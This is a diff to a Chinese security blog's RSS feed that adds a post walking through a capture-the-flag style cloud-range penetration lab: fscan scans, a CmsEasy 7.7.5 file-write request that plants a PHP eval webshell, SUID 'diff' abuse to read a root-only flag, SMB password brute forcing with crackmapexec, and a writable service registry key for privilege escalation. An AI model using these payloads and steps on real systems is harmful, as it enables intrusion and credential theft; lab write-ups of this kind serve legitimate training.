@@ -1,5 +1,193 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Fri, 11 Sep 2026 13:09:44 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Privilege</title><link>https://faabbi.github.io/post/Privilege.html</link><description>&lt;html&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Sun, 13 Sep 2026 02:36:37 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Delegation</title><link>https://faabbi.github.io/post/Delegation.html</link><description>
+# 外网
+
+依旧是fscan开路，不过要注意靶机会封ip，fscan默认会暴力破解的
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.99.146.141
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.99.146.141:80 open
+39.99.146.141:22 open
+39.99.146.141:21 open
+39.99.146.141:3306 open
+[*] alive ports len is: 4
+start vulscan
+[*] WebTitle http://39.99.146.141      code:200 len:68108  title:中文网页标题
+```
+
+这里可以先尝试ftp匿名登陆，但是实际登不上去，这个版本的vsftpd有漏洞但是只是瘫痪服务
+
+web弱密码admin/123456能上去
+
+在登陆前首页扒拉到`CmsEasy 7_7_5_20210919_UTF8`，看着像是7.7.5版本，这个版本确实有个poc
+https://note-hxlab.wetolink.com/share/msJH69Y06ZlS
+但是实际测试有问题，马写不进去，而且有过滤，这个poc可以
+[CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr](https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90)
+
+```bash
+POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1
+Host: 39.99.146.141
+Content-Length: 85
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded;
+Cookie: PHPSESSID=77a1ggekksec3shvure3e5gl2k; loginfalse74c6352c5a281ec5947783b8a186e225=1; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;%3fphp+%40eval($_GET[1])%3b%3f&gt;
+
+```
+直接写马即可，这种小众的cms漏洞poc真的难找，接着上线下vshell就行
+
+
+flag只有root可读
+```bash
+www-data@localhost:/home/flag$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Sep 13 09:19 .
+drwxr-xr-x 3 root root 4096 Jun 22  2022 ..
+-r-------- 1 root root  798 Sep 13 09:19 flag01.txt
+```
+
+s位，不过实际上云镜的linux都直接copy-fail一把梭就拿下了
+
+```bash
+www-data@localhost:/home/flag$ find / -perm -4000 2&gt;/dev/null
+/usr/bin/stapbpf
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/staprun
+/usr/bin/at
+/usr/bin/diff
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+www-data@localhost:/home/flag$ diff --line-format=%L /dev/null flag01.txt
+  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     
+ |  _'\ \| ___'|/ |'|    \| ___'|/U /'___|uU  /'\  u  |_ ' _|     ___     \/'_ \/ | \ |'|    
+/| | | | |  _|' U | | u   |  _|'  \| |  _ / \/ _ \/     | |      |_'_|    | | | |&lt;|  \| |&gt;   
+U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   
+ |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    
+  |||_   &lt;&lt;   &gt;&gt;  //  \\  &lt;&lt;   &gt;&gt;   _)(|_   \\    &gt;&gt;  _// \\_.-,_|___|_,-.  \\    ||   \\,-. 
+ (__)_) (__) (__)(_')('_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_')  (_/  
+
+flag01: flag{8df5a1f4-1238-43ea-a3c8-f4be66bb2c6a}
+
+Great job!!!!!!
+
+Here is the hint: WIN19\Adrian
+
+I'll do whatever I can to rock you...
+www-data@localhost:/home/flag$
+ 
+```
+
+# 内网
+
+flag1 hint了WIN19\Adrian这个账户，外网这台有数据库找一下密码练上去可以查查其实，可能有密码复用，但是这里没有
+
+fscan的时候最好还是不要排除外网主机了，不然它不扫poc和爆破，这版本有点小毛病
+
+```
+root@localhost:~# fscan -h 172.22.4.36/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.4.36     is alive
+(icmp) Target 172.22.4.7      is alive
+(icmp) Target 172.22.4.19     is alive
+(icmp) Target 172.22.4.45     is alive
+[*] Icmp alive hosts len is: 4
+172.22.4.45:80 open
+172.22.4.36:22 open
+172.22.4.36:21 open
+172.22.4.36:80 open
+172.22.4.7:88 open
+172.22.4.36:3306 open
+172.22.4.45:445 open
+172.22.4.19:445 open
+172.22.4.7:445 open
+172.22.4.45:139 open
+172.22.4.19:139 open
+172.22.4.7:139 open
+172.22.4.19:135 open
+172.22.4.45:135 open
+172.22.4.7:135 open
+[*] alive ports len is: 15
+start vulscan
+[*] NetInfo
+[*]172.22.4.19
+   [-&gt;]FILESERVER
+   [-&gt;]172.22.4.19
+[*] NetInfo
+[*]172.22.4.45
+   [-&gt;]WIN19
+   [-&gt;]172.22.4.45
+[*] NetInfo
+[*]172.22.4.7
+   [-&gt;]DC01
+   [-&gt;]172.22.4.7
+[*] NetBios 172.22.4.45     XIAORANG\WIN19
+[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)
+[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
+[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
+[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题
+[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server
+```
+
+|IP|主机名|FQDN / NetBIOS|系统信息|角色判断|开放端口|
+|---|---|---|---|---|---|
+|172.22.4.7|DC01|DC01.xiaorang.lab / DC:DC01|Windows Server 2016 Datacenter 14393|域控 DC|88, 135, 139, 445|
+|172.22.4.19|FILESERVER|FILESERVER.xiaorang.lab|Windows Server 2016 Standard 14393|文件服务器|135, 139, 445|
+|172.22.4.45|WIN19|XIAORANG\WIN19|未明确显示系统版本|成员服务器 / IIS Web|80, 135, 139, 445|
+
+# WIN19
+
+根据hint接下来要打WIN19了，爆破密码就行
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt --local-auth
+```
+能得到密码是babygirl1，过期的连上需要改
+
+桌面上有PrivescCheck，这是个windows提权枚举工具，里面也有检测结果，在PrivescCheck_WIN19.html
+
+```
+Name              : gupdate
+ImagePath         : 'C:\Program Files (x86)\Google\Update\GoogleUpdate.exe' /svc
+User              : LocalSystem
+ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
+IdentityReference : BUILTIN\Users
+Permissions       : WriteDAC, ..., SetValue, CreateSubKey, ...
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : True
+```
+**含义**：`BUILTIN\Users`（Adrian 属于这个组）对 `gupdate` 服务的注册表键有 **SetValue / CreateSubKey / WriteDAC** 权限，而该服务以 **LocalSystem** 运行，并且 **当前用户能启动它**。</description><guid isPermaLink="true">https://faabbi.github.io/post/Delegation.html</guid><pubDate>Sun, 13 Sep 2026 02:36:08 +0000</pubDate></item><item><title>Privilege</title><link>https://faabbi.github.io/post/Privilege.html</link><description>&lt;html&gt;
 &lt;body&gt;
 &lt;!--StartFragment--&gt;&lt;!-- obsidian --&gt;&lt;p&gt;这台机子细节还是挺多的，后面打win参考了挺多wp，毕竟win也才刚入门&lt;/p&gt;
 &lt;h1 data-heading='外网'&gt;外网&lt;/h1&gt;
